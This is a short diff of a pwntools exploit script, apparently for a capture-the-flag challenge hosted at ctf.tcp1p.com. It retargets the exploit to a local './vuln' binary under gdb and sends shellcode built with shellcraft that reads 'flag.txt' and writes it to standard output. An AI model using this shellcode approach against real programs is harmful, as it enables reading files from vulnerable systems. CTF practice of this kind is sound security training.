@@ -2,9 +2,9 @@ from pwn import *
 context(arch='amd64', os='linux')
 
 #p = remote('ctf.tcp1p.com', 8008)
-p = process('./chall')
-#p = gdb.debug('./chall', '''
-#b *main+193''')
+#p = process('./vuln')
+p = gdb.debug('./vuln', '''
+b *main''')
 
 
 file_name = 'flag.txt'
@@ -15,6 +15,7 @@ shellcode = asm(
 	shellcraft.read('rax', 'rsp', length) +
 	shellcraft.write(1, 'rsp', length))
 
-p.recvuntil("me? \n")
-p.sendline(shellcode)
 print(p.recv())
+
+p.sendline(shellcode)
+p.interactive()
